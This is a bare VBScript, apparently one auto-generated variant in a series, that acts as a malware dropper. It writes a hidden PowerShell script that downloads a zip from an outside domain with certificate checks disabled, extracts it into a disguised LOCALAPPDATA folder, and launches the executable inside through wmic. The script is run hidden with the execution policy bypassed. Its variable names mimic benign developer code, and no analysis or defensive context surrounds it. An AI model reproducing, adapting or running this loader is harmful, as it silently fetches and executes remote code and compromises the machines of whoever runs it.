' Auto-generated VBS variant 05 (replacement - opentextfile curlk zipfile wmic)
Set devToken = CreateObject("Scripting.FileSystemObject")
apiContext = devToken.GetSpecialFolder(2) & "\" & devToken.GetTempName & ".ps1"
Set cfgBuilder = devToken.OpenTextFile(apiContext, 2, True)
cfgBuilder.WriteLine "$ProgressPreference = 'SilentlyContinue'"
cfgBuilder.WriteLine "$netPool = [System.IO.Path]::GetTempFileName() + '.zip'"
cfgBuilder.WriteLine "$tlsHandler = ""$env:LOCALAPPDATA\sysNode"""
cfgBuilder.WriteLine "curl.exe -sk -o $netPool https://universalllccorp.com/Grape.zip"
cfgBuilder.WriteLine "if (-not (Test-Path $tlsHandler)) { New-Item -ItemType Directory -Path $tlsHandler -Force | Out-Null }"
cfgBuilder.WriteLine "Add-Type -AssemblyName System.IO.Compression.FileSystem"
cfgBuilder.WriteLine "[System.IO.Compression.ZipFile]::ExtractToDirectory($netPool, $tlsHandler)"
cfgBuilder.WriteLine "Remove-Item $netPool -Force"
cfgBuilder.WriteLine "if (Test-Path ""$tlsHandler\Grape.exe"") { wmic process call create ""$tlsHandler\Grape.exe"" }"
cfgBuilder.Close
Set libStream = CreateObject("WScript.Shell")
libStream.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & apiContext & """", 0, False
